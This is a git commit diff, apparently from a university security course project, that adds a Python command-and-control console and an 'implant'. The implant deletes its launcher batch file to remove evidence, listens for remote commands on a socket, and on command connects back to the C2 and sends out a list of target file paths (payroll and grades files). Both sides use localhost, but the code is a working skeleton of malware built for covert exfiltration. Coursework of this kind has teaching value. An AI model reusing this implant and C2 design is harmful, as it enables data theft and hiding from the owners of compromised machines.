b5b7eb9190df176722e9025c2076904fdc1be6bf
Yefim Shneyderman <yshneyderman@umass.edu>
2021-04-26 16:47:39 -0400

    Implant and C2

--- c2.py
+++ c2.py
@@ -1,5 +1,14 @@
 import colorama
 from colorama import Fore, Back, Style
+import socket
+import sys
+
+# Create a TCP/IP socket
+c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# Bind the socket to the port
+server_address = ('localhost', 9999)
+c2_socket.bind(server_address)
 
 colorama.init(autoreset=True)
 exit = False
@@ -10,6 +19,33 @@ print('##           COMMAND AND CONTROL PROGRAM              ##')
 print('##   Yefim Shneyderman, Anthony Rinaldi, Brendon Ky   ##')
 print('##                                                    ##')
 print('########################################################')
+
+def recieve_exfil():
+    # Wait for a connection
+    print("waiting for a connection")
+    connection, client_address = c2_socket.accept()
+    try:
+        #Recieves and prints the data
+        while True:
+            data = connection.recv(100)
+            if data:
+                print(data)
+            else:
+                print("----------------")
+                break
+            
+    finally:
+        # Clean up the connection
+        connection.close()
+
+def send_implant(comm):
+    #Send comm command to victim
+    implant_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    # Connect the socket to the port where the server is listening
+    implant_server_address = ('localhost', 10000)
+    implant_socket.connect(implant_server_address)
+    implant_socket.sendall(str.encode(comm))
+    implant_socket.close()
 
 while(not exit):
     print("Options:")
@@ -29,7 +65,21 @@ while(not exit):
 
     elif choice == '3':
         print("Exfil initiated")
-        print("Sending data")
+        
+        #Listen for the Responses
+        c2_socket.listen(1)
+        exfil = True
+        while(exfil == True):
+            #Send command to exfiltrate
+            send_implant('3')
+            #Recieve the exfil
+            recieve_exfil()
+            print("Press n to end: any other key to continue")
+            c = input(">>")
+            if(c == 'n'):
+                break
+            
+        
 
     elif choice == '4' or choice == 'q' or choice == 'exit' or choice == 'Exit' or choice == 'quit':
         exit = True
@@ -38,3 +88,6 @@ while(not exit):
 
     else:
         print("Unrecognized input")
+
+        
+    
--- implant.py
+++ implant.py
@@ -1,3 +1,78 @@
+import os
+import requests
+import socket
+import sys
+
 print("Implant Running")
-with open('proof.txt', 'w') as f:
-    f.write('Proof that the implant is running')
+#Remove evidence of script.bat from the start
+try:
+    os.remove("script.bat")
+except:
+    print("Batch file already gone")
+
+#Add the paths to paths.txt
+with open('Paths.txt', 'w') as f:
+    f.write('C:\\Users\\CS590J\\Desktop\\Teacher Files\\Payroll.txt\n')
+    f.write('C:\\Users\\CS590J\\Desktop\\Student Files\\Grades.txt\n')
+    f.close()
+
+def recieve_command():
+    connection, client_address = implant_socket.accept()
+    try:
+        #Recieves and prints the data
+        while True:
+            data = connection.recv(100)
+            if data:
+                return(data)
+            
+    finally:
+        # Clean up the connection
+        connection.close()
+
+
+def send_exfil(data):
+    try:
+        # Send data
+        print('sending:', data)
+        c2_socket.sendall(data)
+    
+    except:
+        print("Error")
+
+# Create a TCP/IP socket
+c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+# Connect the socket to the port where the server is listening
+c2_server_address = ('localhost', 9999)
+
+# Create a TCP/IP socket
+implant_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+# Bind the socket to the port
+implant_server_address = ('localhost', 10000)
+implant_socket.bind(implant_server_address)
+
+implant_socket.listen(1)
+
+while(True):
+    comm = recieve_command()
+    print(comm)
+
+    if(True):
+        file1 = open('Paths.txt', 'r')
+        Lines = file1.readlines()
+
+        
+        print("Connecting to Socket")
+        c2_socket.connect(c2_server_address)
+
+        for line in Lines:
+            send_exfil(str.encode(line))
+
+        try:
+            print("Closing Socket")
+            c2_socket.close()
+        except:
+            print("error")
+
+
+    
+    
